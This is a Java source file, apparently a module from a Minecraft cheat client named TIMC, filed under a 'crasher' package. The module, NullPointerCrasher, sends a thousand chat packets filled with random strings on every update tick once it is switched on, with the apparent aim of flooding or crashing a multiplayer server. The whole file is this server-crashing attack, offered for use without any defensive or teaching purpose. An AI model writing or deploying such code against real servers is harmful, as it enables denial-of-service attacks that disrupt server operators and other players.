package com.teamti.timc.modules.crasher;

import com.teamti.timc.event.EventManager;
import com.teamti.timc.main.TIMC;
import com.teamti.timc.main.Module;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;
import org.lwjgl.input.Keyboard;

import java.util.Random;

public class NullPointerCrasher extends Module {

    public static boolean isEnabled;

    public NullPointerCrasher() {
        super("NullPointerCrasher", Keyboard.KEY_NONE);
        this.jelloCat = TIMC.tabgui.cats.get(2);
    }

    public void onEnable() {
        isEnabled = true;
        EventManager.register(this);
    }

    public void onDisable() {
        EventManager.unregister(this);
        isEnabled = false;
    }
    public void onUpdate() {

        for (int i = 0; i < 1000; ++i) {
            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C01PacketChatMessage(new Random().toString()));
        }
    }
}

